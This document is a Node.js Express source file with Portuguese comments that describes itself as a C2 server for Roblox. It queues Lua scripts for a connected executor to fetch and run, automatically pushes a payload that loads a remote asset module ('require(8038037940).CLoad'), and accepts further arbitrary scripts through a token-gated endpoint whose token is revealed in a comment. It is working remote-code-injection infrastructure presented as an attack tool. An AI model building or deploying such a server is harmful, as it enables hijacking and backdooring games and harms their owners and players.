// language: JavaScript, target: Node.js (Render)
// @author: Ratman4080

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const server = require('http').createServer(app);
const PORT = process.env.PORT || 10000; // O Render exige process.env.PORT

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.text({ limit: '10mb', type: 'text/plain' }));

// Tratamento de erro para JSON malformado
app.use((err, req, res, next) => {
    if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
        console.log('[AVISO] Requisição ignorada: JSON inválido.');
        return res.status(400).json({ erro: 'JSON inválido' });
    }
    next();
});

// ============================================================================
// CONFIGURAÇÃO DO C2
// ============================================================================

// O payload que vai ser injetado no Roblox
const AUTO_PAYLOAD = 'require(8038037940).CLoad("nottheunidex")';

// Fila de scripts (em memória)
let filaScripts = [];
let robloxConectado = false;
let lastPing = Date.now();

// Whitelist (se o cliente quiser usar /executar manualmente)
const whitelist = new Map([
    ['nottheunidex', '8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4'] // Hash SHA-256 de "nottheunidex"
]);

const verifyToken = (nome, token) => {
    if (!whitelist.has(nome)) return false;
    const expectedHash = whitelist.get(nome);
    const providedHash = crypto.createHash('sha256').update(token).digest('hex');
    return providedHash === expectedHash;
};

// ============================================================================
// ROTAS DO SERVIDOR
// ============================================================================

app.get('/', (req, res) => {
    res.send('C2 Server Online. Port: ' + PORT);
});

// 1. O Roblox conecta aqui
app.post('/roblox/conectar', (req, res) => {
    robloxConectado = true;
    lastPing = Date.now();
    console.log(`[ROBLOX] Executor Conectado (IP: ${req.ip})`);
    
    // A MÁGICA: Se o payload ainda não estiver na fila, adiciona automaticamente
    if (!filaScripts.includes(AUTO_PAYLOAD)) {
        filaScripts.push(AUTO_PAYLOAD);
        console.log(`[AUTO-EXEC] Payload enfileirado automaticamente: ${AUTO_PAYLOAD}`);
    }
    
    res.json({ ok: true });
});

// 2. O Roblox busca os scripts aqui
app.get('/pegar_script', (req, res) => {
    lastPing = Date.now(); // Heartbeat

    if (filaScripts.length > 0) {
        const script = filaScripts.shift(); // Pega o primeiro da fila e remove
        console.log(`[ROBLOX] Enviando script para execução...`);
        res.send(script);
    } else {
        res.send(''); // Fila vazia
    }
});

// 3. (Opcional) Injeção manual de scripts via POST
app.post('/executar', (req, res) => {
    try {
        let nome = '', script = '', token = '';

        if (typeof req.body === 'string') {
            try {
                const parsed = JSON.parse(req.body);
                nome = parsed.nome; script = parsed.script; token = parsed.token;
            } catch { nome = req.body; }
        } else if (req.body && typeof req.body === 'object') {
            nome = req.body.nome || '';
            script = req.body.script || '';
            token = req.body.token || '';
        }

        if (!nome || !script || !token) {
            return res.status(400).json({ erro: 'Dados incompletos (nome, script, token)' });
        }

        if (!verifyToken(nome, token)) {
            return res.status(403).json({ erro: 'Token invalido ou nao autorizado' });
        }

        filaScripts.push(script);
        console.log(`[EXECUTOR] Script manual injetado na fila por ${nome}`);
        res.json({ ok: true, queue_size: filaScripts.length });
    } catch (error) {
        res.status(500).json({ erro: error.message });
    }
});

// 4. Status do servidor
app.get('/status', (req, res) => {
    const isAlive = (Date.now() - lastPing) < 30000; // 30s de tolerância para o ping
    res.json({
        roblox_online: robloxConectado && isAlive,
        fila_pendente: filaScripts.length,
        payload_automatico: AUTO_PAYLOAD
    });
});

// ============================================================================
// START
// ============================================================================

server.listen(PORT, () => {
    console.log(`[SERVER] C2 Rodando na porta ${PORT}`);
    console.log(`[SERVER] Aguardando o Roblox se conectar em /roblox/conectar...`);
});
